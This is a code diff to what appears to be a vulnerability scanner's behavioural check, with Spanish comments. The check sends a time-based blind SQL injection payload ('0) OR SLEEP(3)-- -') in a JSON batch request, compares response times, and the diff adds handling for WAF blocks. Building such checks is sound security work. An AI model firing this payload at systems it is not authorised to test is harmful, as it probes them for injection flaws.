@@ -588,15 +588,18 @@ async function behavioralCheck(
     };
   }
 
-  const takeSample = async (sleepSec: number): Promise<number | null> => {
+  const takeSample = async (sleepSec: number): Promise<{ time: number | null; blocked: boolean }> => {
     const value = `0) OR SLEEP(${sleepSec})-- -`;
     const body = JSON.stringify(buildNestedBatchPayload(value));
     const t0 = Date.now();
     try {
-      await fetchFn(workingUrl!, { method: "POST", body });
-      return Date.now() - t0;
+      const { status } = await fetchFn(workingUrl!, { method: "POST", body });
+      if (status === 403 || status === 401) {
+        return { time: null, blocked: true };
+      }
+      return { time: Date.now() - t0, blocked: false };
     } catch {
-      return null;
+      return { time: null, blocked: false };
     }
   };
 
@@ -605,8 +608,15 @@ async function behavioralCheck(
 
   // 1 muestra baseline SLEEP(0) + 1 muestra inyectada SLEEP(3)
   // Reducido a 1+1 para caber dentro del timeout de 30s de Vercel
-  const tBase = await takeSample(0);
-  if (tBase === null) {
+  const baseResult = await takeSample(0);
+  if (baseResult.blocked) {
+    return {
+      vulnerable: null,
+      signal:
+        "Prueba conductual: el WAF bloqueó la petición de referencia (SLEEP pattern detectado). Prueba abortada.",
+    };
+  }
+  if (baseResult.time === null) {
     return {
       vulnerable: null,
       signal:
@@ -614,8 +624,15 @@ async function behavioralCheck(
     };
   }
 
-  const tInjected = await takeSample(3);
-  if (tInjected === null) {
+  const injectResult = await takeSample(3);
+  if (injectResult.blocked) {
+    return {
+      vulnerable: null,
+      signal:
+        "El WAF bloqueó el payload con patrón SQLi (SLEEP(3)-- -). El batch endpoint es parcialmente accesible pero los payloads de inyección son filtrados. El sitio podría estar protegido por WAF.",
+    };
+  }
+  if (injectResult.time === null) {
     return {
       vulnerable: null,
       signal:
@@ -623,19 +640,19 @@ async function behavioralCheck(
     };
   }
 
-  const delta = (tInjected - tBase) / 1000;
+  const delta = (injectResult.time - baseResult.time) / 1000;
   const threshold = 2.0;
 
   if (delta >= threshold) {
     return {
       vulnerable: true,
-      signal: `[confianza reducida — muestra única] Prueba conductual POSITIVA: SLEEP(3) tardó ${(tInjected / 1000).toFixed(1)}s vs ${(tBase / 1000).toFixed(1)}s de referencia (Δ=${delta.toFixed(1)}s, umbral ${threshold}s). El sitio ES vulnerable.`,
+      signal: `[confianza reducida — muestra única] Prueba conductual POSITIVA: SLEEP(3) tardó ${(injectResult.time / 1000).toFixed(1)}s vs ${(baseResult.time / 1000).toFixed(1)}s de referencia (Δ=${delta.toFixed(1)}s, umbral ${threshold}s). El sitio ES vulnerable.`,
     };
   }
 
   return {
     vulnerable: false,
-    signal: `[confianza reducida — muestra única] Prueba conductual negativa: sin diferencia de tiempo significativa (SLEEP 3 → ${(tInjected / 1000).toFixed(1)}s, ref → ${(tBase / 1000).toFixed(1)}s, Δ=${delta.toFixed(1)}s). El sitio parece estar parcheado.`,
+    signal: `[confianza reducida — muestra única] Prueba conductual negativa: sin diferencia de tiempo significativa (SLEEP 3 → ${(injectResult.time / 1000).toFixed(1)}s, ref → ${(baseResult.time / 1000).toFixed(1)}s, Δ=${delta.toFixed(1)}s). El sitio parece estar parcheado.`,
   };
 }
 
